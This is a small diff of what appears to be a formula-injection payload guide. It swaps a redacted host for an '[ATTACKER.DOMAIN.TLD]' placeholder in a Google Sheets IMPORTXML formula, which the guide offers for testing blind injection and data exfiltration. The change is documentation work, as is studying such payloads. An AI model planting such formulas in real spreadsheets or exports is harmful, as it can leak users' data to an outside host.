@@ -76,7 +76,7 @@ Google Sheets allows some additional formulas that are able to fetch remote URLs
 So one can test blind formula injection or a potential for data exfiltration with:
 
 ```text
-=IMPORTXML("http://[REDACTED]/csv", "//a/@href")
+=IMPORTXML("http://[ATTACKER.DOMAIN.TLD]/csv", "//a/@href")
 ```
 
 Note: an alert will warn the user a formula is trying to contact an external resource and ask for authorization.
